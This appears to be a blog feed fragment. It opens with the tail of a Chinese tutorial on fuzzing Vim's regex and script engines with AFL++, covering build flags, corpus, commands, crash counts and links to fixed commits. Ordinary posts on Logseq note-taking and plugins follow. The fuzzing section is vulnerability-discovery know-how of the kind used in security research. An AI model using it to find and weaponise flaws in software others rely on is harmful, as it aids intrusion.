class="hljs-bullet">- </span>-c &lt;command&gt; 加载第一个文件后执行 &lt;command&gt;<br><span class="hljs-bullet">- </span>-n 不使用交换文件，只使用内存<br><span class="hljs-bullet">- </span>-m Modifications not allowed to be written<br></code></pre></td></tr></table></figure><h3 id="5-0-vim-的-Ex-模式介绍"><a href="#5-0-vim-的-Ex-模式介绍" class="headerlink" title="5.0 vim 的 Ex 模式介绍"></a>5.0 vim 的 Ex 模式介绍</h3><p>Vim 编译器有三种模式：普通模式、插入模式和 ex 模式。ex 模式是 Vim 的底层命令模式，用于执行各种文件操作，如打开、编辑、保存、搜索、替换、排序等。要进入 ex 模式，可以按下 : 键。在 ex 模式下，可以输入各种命令来执行操作。命令由行号和命令组成，以回车键结束。</p><p>最基本的 ex 命令是 p 命令，用于打印指定行号的行。例如，要打印第 10 行，可以输入 10p。</p><p>其他常用的 ex 命令包括：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">e 命令：打开另一个文件<br>w 命令：保存当前文件<br>q 命令：退出 Vim<br>s 命令：将当前行替换为指定文本<br>g<span class="hljs-operator">/</span><span class="hljs-keyword">pattern</span><span class="hljs-operator">/</span>s<span class="hljs-operator">/</span><span class="hljs-keyword">old</span><span class="hljs-operator">/</span><span class="hljs-keyword">new</span><span class="hljs-operator">/</span> 命令：将所有匹配模式 <span class="hljs-keyword">pattern</span> 的行替换为 <span class="hljs-keyword">old</span> 替换为 <span class="hljs-keyword">new</span>。<br>:sort 命令：对当前文件进行排序。<br></code></pre></td></tr></table></figure><p>ex 模式的使用方法如下：在普通模式下，按下 : 键进入 ex 模式，输入命令，按下回车键执行命令。</p><p>以下是一些 ex 模式的使用示例：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 打开文件</span><br><span class="hljs-symbol">:e</span> test.txt<br><br><span class="hljs-comment"># 编辑文件</span><br><span class="hljs-number">10</span>iHello, world!<br><br><span class="hljs-comment"># 保存文件</span><br><span class="hljs-symbol">:w</span><br><br><span class="hljs-comment"># 退出 Vim</span><br><span class="hljs-symbol">:q</span><br></code></pre></td></tr></table></figure><p>ex 模式提供了丰富的命令，可以用于执行各种文件操作。熟练掌握 ex 模式可以提高 Vim 的使用效率。</p><h3 id="5-1-攻击面分析"><a href="#5-1-攻击面分析" class="headerlink" title="5.1 攻击面分析"></a>5.1 攻击面分析</h3><p>研究历史漏洞发现，vim 主要有两个攻击面， vim 正则表达式引擎和vim 脚本执行引擎。</p><h4 id="vim-的正则表达式引擎"><a href="#vim-的正则表达式引擎" class="headerlink" title="vim 的正则表达式引擎"></a>vim 的正则表达式引擎</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">./vim -u <span class="hljs-built_in">NONE</span> -i <span class="hljs-built_in">NONE</span> -X -Z -m -n -e -s -c <span class="hljs-string">&#x27;call search(getline(&quot;.&quot;))&#x27;</span> -c <span class="hljs-string">&#x27;:qa!&#x27;</span> ./poc<br></code></pre></td></tr></table></figure><h4 id="vim-的脚本执行引擎"><a href="#vim-的脚本执行引擎" class="headerlink" title="vim 的脚本执行引擎"></a>vim 的脚本执行引擎</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">vim -u <span class="hljs-built_in">NONE</span> -i <span class="hljs-built_in">NONE</span> -X -Z -m -n -e -s -S ./poc -c <span class="hljs-string">&#x27;:qa!&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="5-2-编译-vim"><a href="#5-2-编译-vim" class="headerlink" title="5.2 编译 vim"></a>5.2 编译 vim</h3><p>首先下载 vim 的源码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/vim/vim.git<br></code></pre></td></tr></table></figure><p>编译 vim ，使用 afl-cc 插桩</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-15&quot;</span><br><span class="hljs-built_in">export</span> CFLAGS=<span class="hljs-string">&quot;-O1 -g -fno-omit-frame-pointer&quot;</span><br><span class="hljs-built_in">cd</span> vim<br>CC=afl-cc CXX=afl-c++ ./configure --with-features=huge --enable-gui=none --disable-shared<br>make<br></code></pre></td></tr></table></figure><h3 id="5-3-寻找-fuzz-vim-的-testcases-corpus"><a href="#5-3-寻找-fuzz-vim-的-testcases-corpus" class="headerlink" title="5.3 寻找 fuzz vim 的 testcases ( corpus)"></a>5.3 寻找 fuzz vim 的 testcases ( corpus)</h3><p>vim 官方仓库里有历史上造成 vim crash 的 poc ，正好拿来用。<br><a href="https://github.com/vim/vim/tree/master/src/testdir/crash">https://github.com/vim/vim/tree/master/src/testdir/crash</a></p><h3 id="5-4-fuzz-vim"><a href="#5-4-fuzz-vim" class="headerlink" title="5.4 fuzz vim"></a>5.4 fuzz vim</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p ~/fuzz/vim<br><span class="hljs-built_in">mkdir</span> -p /tmp/afl++<br>afl-fuzz -i testdir/crash/ -o ~/fuzz/vim -mnone -p fast -- ./vim -u NONE -i NONE -X -Z -m -n -e -s -S @@ -c <span class="hljs-string">&#x27;:qa!&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>-x 指定字典文件</li><li>-mnone 不限制使用内存</li></ul><h3 id="5-5-fuzz-结果"><a href="#5-5-fuzz-结果" class="headerlink" title="5.5  fuzz 结果"></a>5.5  fuzz 结果</h3><p>经过 2天 16 小时的 fuzz， AFL++ 报告有 789 个 Crashes.</p><h3 id="5-6-调整和改进"><a href="#5-6-调整和改进" class="headerlink" title="5.6 调整和改进"></a>5.6 调整和改进</h3><p><code>~/fuzz/vim/default</code> 目录出现了大量的 <code> _cur_inp.*</code> 文件，这是 AFL++ 生成的的临时文件，为了取得更好的效果，需要把这些文件放到 &#x2F;tmp 目录。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> AFL_TMPDIR=/tmp/afl++<br></code></pre></td></tr></table></figure><p>使用 AFL++ 的 cmplog 特性，解决一些  fuzz 上的路径约束, 主要思路来自 <a href="https://github.com/RUB-SysSec/redqueen">https://github.com/RUB-SysSec/redqueen</a> 。<br><a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.cmplog.md">https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.cmplog.md</a></p><p>要使用 cmplog，需要重新编译 vim，使用 <code>AFL_LLVM_CMPLOG</code> 环境变量，指定使用 cmplog 的编译。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cp</span> src/vim src/vim-afl<br>make distclean<br><br><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-15&quot;</span><br><span class="hljs-built_in">export</span> CFLAGS=<span class="hljs-string">&quot;-O1 -g -fno-omit-frame-pointer&quot;</span><br><span class="hljs-built_in">cd</span> vim-cmplog<br><span class="hljs-built_in">export</span> AFL_LLVM_CMPLOG=1<br>CC=afl-cc CXX=afl-c++ ./configure --with-features=huge --enable-gui=none<br>make<br><span class="hljs-built_in">mv</span> src/vim src/vim-cmplog<br></code></pre></td></tr></table></figure><p>编译完成后，将编译好的 vim 重命名成 vim-cmplog，可以使用下面的 AFL++ 命令行，启用 cmplog</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> AFL_TMPDIR=/tmp/afl++-cmplog<br>afl-fuzz -i testdir/crash/ -o ~/fuzz/vim -mnone -p fast -S cmplog -c ./vim-cmplog -- ./vim-afl -u NONE -i NONE -X -Z -m -n -e -s -S @@ -c <span class="hljs-string">&#x27;:qa!&#x27;</span><br></code></pre></td></tr></table></figure><p>同时运行两个 AFL++ 对 vim 进行 fuzz。</p><h2 id="Trophy"><a href="#Trophy" class="headerlink" title="Trophy"></a>Trophy</h2><p>历史上使用上述方法发现了许多 vim 漏洞，部分漏洞 vim 官方已经修复。</p><p><a href="https://github.com/vim/vim/commit/0fb375aae608d7306b4baf9c1f906961f32e2abf">https://github.com/vim/vim/commit/0fb375aae608d7306b4baf9c1f906961f32e2abf</a><br><a href="https://github.com/vim/vim/commit/b39b240c386a5a29241415541f1c99e2e6b8ce47">https://github.com/vim/vim/commit/b39b240c386a5a29241415541f1c99e2e6b8ce47</a><br><a href="https://github.com/vim/vim/commit/eec0c2b3a4cfab93dd8d4adaa60638d47a2bbc8a">https://github.com/vim/vim/commit/eec0c2b3a4cfab93dd8d4adaa60638d47a2bbc8a</a><br><a href="https://github.com/vim/vim/commit/abfa13ebe92d81aaf66669c428d767847b577453">https://github.com/vim/vim/commit/abfa13ebe92d81aaf66669c428d767847b577453</a></p><h2 id="☆-参考资料"><a href="#☆-参考资料" class="headerlink" title="☆  参考资料"></a>☆  参考资料</h2><p>[1]  <a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/INSTALL.md">https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/INSTALL.md</a><br>[2]  <a href="https://github.com/AFLplusplus/AFLplusplus/tree/stable">AFL ++ stable branch</a><br>[3]  <a href="https://github.com/AFLplusplus/AFLplusplus/tree/dev">AFL++ dev branch</a><br>[4] <a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.llvm.md">https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.llvm.md</a><br>[5] <a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.cmplog.md">https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.cmplog.md</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的 Logseq 使用实践</title>
    <link href="/cn/logseq_practice/"/>
    <url>/cn/logseq_practice/</url>
    
    <content type="html"><![CDATA[<p>近两年陆陆续续发表了一系列关于 Logseq 实践的文字，零散不易查找阅读，抽空整理成一篇文章，希望能对大家有所帮助。</p><h2 id="Logseq-光速入门"><a href="#Logseq-光速入门" class="headerlink" title="Logseq 光速入门"></a>Logseq 光速入门</h2><p>Logseq 是个不错的工具，就是学习曲线有点陡峭，上手不太容易，最开始可以从 journal 开始，进行日常记事并使用任务管理功能安排日程。</p><p>Logseq 的高阶用法是利用 query 建立自己的工作流 （workflow），使用基于 Query 的 workflow 提示 next action 是 Logseq 最精华的功能，Logseq 的资深用户都是 Query base workflow 的爱好者。</p><p>但是入门还是建议从基础功能的使用开始 （日志，双链，大纲，本地存储 ）。我自己写过 Logseq 四篇，现在由于笔记系统上手熟练，输出反倒不如从前，有点惭愧。</p><p><a href="https://www.usmacd.com/cn/logseq/">Logseq 试用报告</a><br><a href="https://www.usmacd.com/cn/logseq2/">Logseq 使用小结（二）</a><br><a href="https://www.usmacd.com/cn/logseq3/">Logseq 使用小结（三）</a><br><a href="https://www.usmacd.com/cn/logseq_plugins/">我正在使用的 Logseq Plugin</a></p><p>关于 Logseq 的使用，Luhmann 写了不少高质量的 Logseq 文章，放在他个人的网站上 <a href="https://luhmann-logseq.notion.site/">https://luhmann-logseq.notion.site</a> 可以阅读一下。</p><p>Luhmann 写的经典文章 三个强大的工具和三个选择，内容非常得好，使用 Logseq 前阅读一遍可以少走许多弯路。尤其是三个选择这篇，在使用 Logseq 前如果不仔细思考，后期要推翻重来的话就非常麻烦了。</p><div class="note note-info">            <p><a href="https://discuss.logseq.com/t/three-power-tools-i-wish-id-known-about-when-i-started-using-logseq/1683">Three power-tools I wish I’d known about when I started using Logseq</a></p><ul><li>Templates</li><li>Aliases</li><li>Page-tags</li></ul><p><a href="https://discuss.logseq.com/t/three-choices-new-users-need-to-make/3411">Three Choices New Users Need to Make</a></p><ul><li>First choice: to use a daily journal or not?</li><li>Second Choice: tags, hierarchy, or page-tags?</li><li>Third choice: One graph for everything, or multiple graphs?</li></ul>          </div><h2 id="Logseq-同步功能的情况"><a href="#Logseq-同步功能的情况" class="headerlink" title="Logseq 同步功能的情况"></a>Logseq 同步功能的情况</h2><p>只有赞助用户（Logseq Discord 服务器 Backer 角色）可以使用Logseq 官方提供的同步功能，但是 Logseq 官方提供的同步功能不太稳定。我在 Discord 上看到了太多数据丢失的例子，所以我不敢用。</p><p>同步导致数据丢失的情况在 Logseq 多端同步的用户中最为常见，多端同步指多个设备之间数据同步，比如 MacBook 和 iPhone 之间的数据同步。</p><p>我使用第三方网盘单向同步，只有一个设备和网盘自动同步（写网盘），其他设备读网盘后，手动复制一份数据。</p><p>最近看到许多 Community 用户使用 <a href="https://syncthing.net/">Syncthing</a> 进行多端同步，效果好像不错，但我自己没有尝试这种方法。(推友 Mengxin Liu 反馈，Syncthing 同步效果也不太好)</p><h2 id="Journal-or-Page-？"><a href="#Journal-or-Page-？" class="headerlink" title="Journal or Page ？"></a>Journal or Page ？</h2><p>Logseq 用户经常会遇上一个问题，究竟是在 journal 写笔记还是新开一个 page 写。community Luhmann 用户给出他的 flowchat，我觉得写得非常好。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/logseq5_1.jpeg" alt="Journal or Page"></p><p>我自己的用法可以简单的概括为，在 Journal 记录较为零散的片段，在 Page 中对 Journal 中的片段进行重新组合Organize（聚合、重组、整合）。</p><p>Page 中保存较为正式的文字，Journal 中则会较为杂乱地记录想法。按照第二大脑 CODE 的说法，Journal 里 Capture ，Page 里 Organize 。</p><h2 id="Journal-该写点啥-？"><a href="#Journal-该写点啥-？" class="headerlink" title="Journal 该写点啥 ？"></a>Journal 该写点啥 ？</h2><p>哪些内容值得记录，是非常常见的问题。蒂亚戈•福特在《打造第二大脑》一书说认为，值得记录的内容一般有两类。</p><div class="note note-info">            <p><strong>一类，直接从外部世界中获得</strong>，比如：<br>    - 标记的重点：书籍或文章高亮（highlight）的内容<br>    - 引用的佳句：播客或有声读物中令人印象深刻的内容<br>    - 语音备忘：移动设备上记录的语音片段<br>    - 书签或收藏夹：你感兴趣的网页或社交媒体的链接<br>    - 课程要点：参加课程，会议，演讲等活动收获的启示<br>    - 图片：启发灵感的或有趣的照片或者图片</p><p><strong>一类，从内部世界获得</strong>，比如：<br>    - 故事：发生在你自己或者别人的趣事<br>    - 洞见：对事物小的和大的见解<br>    - 记忆：生活中不想忘记的经历<br>    - 反思：写在日记上的个人想法和人生教训<br>    - 沉思：随机在脑海里浮现想法（比如洗澡时）</p>          </div><p>虽然内心世界的感悟很珍贵，但是引起共鸣的内容（原文）也很有价值。原文的价值主要在下面两点：</p><ol><li>溯源：使我们的思考有坚实的基础，有利于构建思考链条</li><li>启发：让我们产生共鸣的内容，可能再次给我们带来启发</li></ol><p>我在 Logseq 的 Journal 中有两个保留内容 [[生活随记]] 和 [[每日心得]]，在回顾笔记的过程中觉得这些内容还是挺有意义的。</p><p>这些内容从某种意义上来说相当于日记，每天都对自己的经历进行记录就像照镜子一般，「每日三省吾身」 值得坚持。对待同一事物，不同时期的心境并不相同。记录下当下的感受，后期再回过来看感触还是挺大的。</p><h2 id="使用-Logseq-进行时间登记"><a href="#使用-Logseq-进行时间登记" class="headerlink" title="使用 Logseq 进行时间登记"></a>使用 Logseq 进行时间登记</h2><p>受图拉鼎的影响，利用 Logseq 启用严格的时间登记，效果不错。方法很简单，支持 markdown 的编辑器理论上都可行。</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-comment">## Time-block Grid</span><br><span class="hljs-literal">-</span> DONE task1  <span class="hljs-comment"># projectx   09:00 am</span><br><span class="hljs-literal">-</span> DONE task2  <span class="hljs-comment"># projectx   10:00 am</span><br><span class="hljs-literal">-</span> TODO task3  <span class="hljs-comment"># projecty   1:00 pm</span><br></code></pre></td></tr></table></figure><p>关于为什么要时间登记，可以阅读采访图拉鼎的播客 <a href="https://www.usmacd.com/cn/tulading/">图拉鼎谈独立开发</a></p><h2 id="使用-Logseq-定期回顾笔记"><a href="#使用-Logseq-定期回顾笔记" class="headerlink" title="使用 Logseq 定期回顾笔记"></a>使用 Logseq 定期回顾笔记</h2><p>定期回顾自己的笔记大体有下面几个好处:</p><ul><li>对抗遗忘曲线：尤其是文献笔记等自己不熟悉的笔记</li><li>推动知识内化，想法迭代：知识结构优化，新旧知识连接</li><li>遇见过去的自己： 挺好玩，挺有趣</li><li>影响现实：促进自我审视，提供思路和线索</li></ul><p>Logseq 软件没有内置随机浏览笔记的插件，第三方提供的 Plugin 可以实现这个目的，从 MarketPlace 下载 logseq-random-note 或者 Logseq Banners plugin 即可。</p><p>在我的知识管理工作流（workflow）中定期回顾笔记是非常重要的一个部分，经常都有意想不到的收获，在 <a href="https://www.usmacd.com/cn/note_review/">定期回顾笔记的好处</a> 中有更加具体的阐述。</p><h2 id="利用-Logseq-来实践卡片笔记工作流"><a href="#利用-Logseq-来实践卡片笔记工作流" class="headerlink" title="利用 Logseq 来实践卡片笔记工作流"></a>利用 Logseq 来实践卡片笔记工作流</h2><p>总体思路</p><ul><li>利用模板自动化输入笔记格式，完成闪念笔记、文献笔记、引用笔记、 永久笔记的输入的标准化</li><li>利用 query 来自动提示下一步的操作，使得整个工作流 actionable</li></ul><p>fleeting note</p><ul><li>在 daily journal 里利用模板写闪念笔记，将闪念笔记标记为 TODO （意味着后续需要采取行动），当闪念笔记被丢弃或者转为永久笔记后标记为 DONE</li><li>利用 query 在 journal 自动提示未完成的 闪念笔记，自动提示标记 TODO 的闪念笔记</li></ul><p>reference note</p><ul><li>在 daily journal 里利用模板写 reference 笔记，所有阅读过的资料都记录一条 reference 笔记</li><li>对于 reference 中的文章、论文、或书籍，需要深入分析的话，就新建一个页面在里面写笔记</li><li>利用 query 列出所有 reference 笔记，相当于拥有了个人的图书馆 (索引)</li></ul><p>permanent note</p><ul><li>在 daily query 页面利用模板写永久笔记，永久笔记自编号</li><li>在单独的页面写永久笔记具体内容，在永久笔记页面纪录来源，父永久笔记</li></ul><p>使用 Logseq 时一定要多用 Template 功能，这是保证笔记格式一致性的关键，可以自动提示应该记录的信息，具体内容可以参考我前段时间写的 <a href="https://www.usmacd.com/cn/zel_note_flow">卡片盒笔记法总体思路与工作流</a></p><h2 id="Zettelkasten-PARA-的-Logseq-实践"><a href="#Zettelkasten-PARA-的-Logseq-实践" class="headerlink" title="Zettelkasten + PARA 的 Logseq 实践"></a>Zettelkasten + PARA 的 Logseq 实践</h2><p>自从使用 Logseq 实践 Zettelkasten 后，我大致发了 1000 条推文，其中有阅读的文献笔记，也有自己思考的永久笔记。我在这两年的时间思考了大量的问题，受益匪浅。 写卡片笔记的目的是为了促进思考，目前正在实践的 PARA 又证明可以推动项目的进展。</p><p>笔记工具有没有用，关键在于人，需要有方法论的支撑，如果没有方法论的指导，认为使用一个工具就可以解决所有问题，世界上没有这么神奇的工具。</p><p>PARA 使用分类的方法将所有的信息分成四类：Projects (可操作的短期目标)，Areas (持续关注的长期目标)，Resources (感兴趣的主题)，Archives (前三类中不活跃的)</p><div class="note note-info">            <ul><li>Projects：短期目标，有截止时间 ： 购买新电脑，写研究报告，设置新客厅家具 等</li><li>Areas：长期目标和负责的内容：如 父亲，产品管理，健康，财务 等</li><li>Resources： 感兴趣的主题：呼吸练习，摄影，咖啡，金融投资 等</li><li>Archives ：不再活跃的前三类：完成或暂停的项目，不再活跃的领域，不感兴趣的主题 等</li></ul>          </div><p> PARA 并不是将东西放进文件夹的分类，而是识别你所负责的工作和生活的结构。关于 PARA 方法，我使用 Claude 翻译了 Tiago Forte 的文章 <a href="https://www.usmacd.com/cn/PARA/">一秒钟内整理数字生活的系统</a>，文章里有更加详细的介绍 。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/logseq5_2.jpeg" alt="Logseq graph"></p><h2 id="不要神话双链笔记方法"><a href="#不要神话双链笔记方法" class="headerlink" title="不要神话双链笔记方法"></a>不要神话双链笔记方法</h2><p>用了两年的 Logseq 后，神奇的发现我好像不怎么使用双链了。</p><p>Journal 的好处是可以随时输入一个较为完整的文字片段，心智负担很小。 但如果要真正对某个主题有较为深刻的理解，需要将零碎片段的完整逻辑和前后关系串连起来。</p><p>真正可以实现这个目标的是写文章，而不是依靠双向链接。 只要写文章的时候，你需要的所有内容都在同一个地方，具体的是用使用标签，还是文件夹都不是重要。</p><p>知识体系的构建是通过不断学习和自我迭代来实现，边界的延伸则可以跟随着自己的好奇心，学习真的是一件很有趣的事情。</p><p>最近有一个体会，工具真的不重要，底层方法论才是重要的东西。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.usmacd.com/cn/zel_note_flow/">卡片盒笔记法总体思路与工作流</a></li><li><a href="https//wilde-at-heart.garden/pages/my-zettelkasten-workflow-from-start-to-finish/">My Zettelkasten workflow from start to finish</a></li><li><a href="https://www.usmacd.com/cn/note_review/">定期回顾笔记的好处</a></li><li><a href="https://www.usmacd.com/cn/PARA/">一秒钟内整理数字生活的系统</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Some Logseq plugins I&#39;m currently using</title>
    <link href="/en/logseq_plugins_en/"/>
    <url>/en/logseq_plugins_en/</url>
    
    <content type="html"><![CDATA[<p>Recommend some Logseq plugins I’m currently using. The functions of these plugins are very practical. You can refer to my previous article <a href="https://www.usmacd.com/cn/logseq2/">Logseq Usage Summary (Two)</a> for the method of installing Logseq plugins.</p><h2 id="logseq-random-note"><a href="#logseq-random-note" class="headerlink" title="logseq-random-note"></a>logseq-random-note</h2><p><a href="https://github.com/TankCool/logseq-random-note">https://github.com/TankCool/logseq-random-note</a></p><p>A plugin for randomly browsing notes in Logseq. The fact that Logseq doesn’t have a default random note feature may be an oversight, in contrast, Obsidian has a built-in “open random note” Core Plugin. Regarding the benefits of randomly discovering notes, I have written a dedicated article on <a href="https://www.usmacd.com/cn/note_review/">the advantages of periodically reviewing notes</a>. In my Logseq workflow, regularly reviewing notes is an essential part, often leading to unexpected gains.</p><p>The logseq random note plugin has an issue during usage, it uses the JavaScript <code>math.random</code> function to generate random numbers, which is of low quality, causing the random note plugin to frequently access the same note. I submitted a pull request to the plugin github repository, but the original author did not merge it. If you encounter the issue I mentioned during use, you can try my modified version of the plugin <a href="https://github.com/henices/logseq-random-note">https://github.com/henices/logseq-random-note</a></p><h2 id="logseq-Banners-plugin"><a href="#logseq-Banners-plugin" class="headerlink" title="logseq Banners plugin"></a>logseq Banners plugin</h2><p><a href="https://github.com/yoyurec/logseq-banners-plugin">https://github.com/yoyurec/logseq-banners-plugin</a></p><p>Displays banners in Logseq’s Journal or other pages. The banner can include Calendar, Weather, Pomodoro, and Random quote widgets, providing customization and free combination. I only use the random note feature, allowing me to see my previous notes unintentionally every day, which feels great.</p><p><img src="https://raw.githubusercontent.com/yoyurec/logseq-banners-plugin/main/screenshots/widgets-light-01.png" alt="banner plugin"></p><h2 id="logseq-page-tags-and-Hierarchy"><a href="#logseq-page-tags-and-Hierarchy" class="headerlink" title="logseq page-tags and Hierarchy"></a>logseq page-tags and Hierarchy</h2><p><a href="https://github.com/YU000jp/logseq-page-tags-and-hierarchy">https://github.com/YU000jp/logseq-page-tags-and-hierarchy</a></p><p>A plugin that visually displays Page-tags and Hierarchy in a page, without needing to scroll to the bottom of the page. Logseq’s Page-tags and namespace features are not as well-known as other features. Regrettably, I couldn’t find a clear explanation in Logseq’s documentation.</p><p>The namespace defines the hierarchical relationship between pages, and you can see the hierarchy at the bottom of a page. The namespace has two representation methods:</p><ul><li><code>#topic/topic0/topic1</code></li><li><code>[[topic/topic0/topic1]]</code></li></ul><p>I generally use the former expression, as it’s simpler. When I type <code>#topic</code>, Logseq automatically suggests <code>#topic/topic0</code> and <code>#topic/topic0/topic1</code>, which is very convenient.</p><p>Page-tags are a special property in the first block of a page, using <code>tags:: #topic</code> will make this page visible at the bottom of the <code>topic</code> page in reverse.</p><p>During actual usage, once a page’s content grows, checking Page-tags and the namespace Hierarchy requires scrolling to the bottom of the page, which is very inconvenient. This plugin was developed to solve this issue.</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/logseq4-page-tags.png" alt="page-tags"></p><h2 id="logseq-assets-plus"><a href="#logseq-assets-plus" class="headerlink" title="logseq-assets-plus"></a>logseq-assets-plus</h2><p><a href="https://github.com/xyhp915/logseq-assets-plus">https://github.com/xyhp915/logseq-assets-plus</a></p><p>A plugin for conveniently inserting assets, with the shortcut <code>ctrl/cmd+Shift+o</code>. In Logseq, the method to insert an asset is to use the <code>/upload a asset</code> command, press enter, and a dialog box will pop up for you to select the file you want to save. However, to insert an existing asset into a block, you can only search by name. Logseq assets plus provides richer filtering methods.</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/logseq4-asset-plus.png" alt="asset-plus"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li>Logseq 使用小结 （二）<a href="https://www.usmacd.com/cn/logseq2/">https://www.usmacd.com/cn/logseq2/</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我正在使用的 Logseq Plugin (插件)</title>
    <link href="/cn/logseq_plugins/"/>
    <url>/cn/logseq_plugins/</url>
    
    <content type="html"><![CDATA[<p>推荐一些我正在使用的 <a href="https://github.com/logseq/logseq">Logseq</a> 插件，这些插件的功能都非常实用。Logseq 安装插件的方法可以参考我以前写的文章 <a href="https://www.usmacd.com/cn/logseq2/">Logseq 使用小结 （二）</a> 。</p><h2 id="logseq-random-note"><a href="#logseq-random-note" class="headerlink" title="logseq-random-note"></a>logseq-random-note</h2><p><a href="https://github.com/TankCool/logseq-random-note">https://github.com/TankCool/logseq-random-note</a></p><p>在 Logseq 中随机浏览笔记的插件。Logseq 没有默认的随机笔记功能可能是一个失误，反观 Obsidian 就有内置 open random note 的功能。关于随机发现笔记的作用，我专门写过一篇文章 <a href="https://www.usmacd.com/cn/note_review/">定期回顾笔记的好处</a>。在我的 Logseq 工作流(workflow) 中，定期回顾笔记是非常重要的部分，经常都能获得意想不到的收获。</p><p>logseq random note 插件在使用中有一个问题，生成随机数时使用了 javascript math.random 函数，这个函数生成的随机数质量不高，导致 random note 插件经常会访问同一个笔记。我向原仓库提交了修改后的源码，但是原作者没有合并。如果在使用的时候遇上我说的这个问题，可以试试我的修改版插件 <a href="https://github.com/henices/logseq-random-note">https://github.com/henices/logseq-random-note</a></p><h2 id="Logseq-Banners-plugin"><a href="#Logseq-Banners-plugin" class="headerlink" title="Logseq Banners plugin"></a>Logseq Banners plugin</h2><p><a href="https://github.com/yoyurec/logseq-banners-plugin">https://github.com/yoyurec/logseq-banners-plugin</a><br>在 Logseq 的 Journal 或者其他页面显示 banner 。Banner 中可以添加 Calendar，Weather，Pomodoro，Random quote 小组件，提供自定义功能，可以自由组合。我只使用了 random note 的功能，每天都可以不经意的看到以前的笔记，感觉非常不错。</p><p><img src="https://raw.githubusercontent.com/yoyurec/logseq-banners-plugin/main/screenshots/widgets-light-01.png" alt="banner plugin"></p><h2 id="Page-tags-and-Hierarchy"><a href="#Page-tags-and-Hierarchy" class="headerlink" title="Page-tags and Hierarchy"></a>Page-tags and Hierarchy</h2><p><a href="https://github.com/YU000jp/logseq-page-tags-and-hierarchy">https://github.com/YU000jp/logseq-page-tags-and-hierarchy</a></p><p>在页面中直观得看见 Page-tags 和 Hierarchy，不用滚动到页面底部的插件。Logseq Page-tags 和 namespace 特性，并不像其他特性被人们熟知。比较遗憾的是我没有在 Logseq 的文档中找到明确的说明。</p><p>namespace 定义了 page 之间的层级关系，可以在一个页面的底部看出层级关系。namespace 有两种表示方式：</p><ul><li><code>#topic/topic0/topic1</code></li><li><code>[[topic/topic0/topic1]]</code></li></ul><p>我一般都使用前面的表达方式，比较简单，输入 <code>#topic</code> Logseq 就会自动提示 <code>#topic/topic0</code> 和 <code>#topic/topic0/topic1</code> 非常方便。</p><p>Page-tags 是一个特殊的属性，在一个 page 的第一个block 使用 <code>tags:: #topic</code> 可以在topic 页面底部反向查看到这个 page。</p><p>实际使用的过程中会发现，一旦页面的内容多了，要查看 Page-tags 和 namespace 的 Hierarchy 必须滚动到页面底部非常费事，这个插件就是为了解决这个问题而开发的。</p><p><img 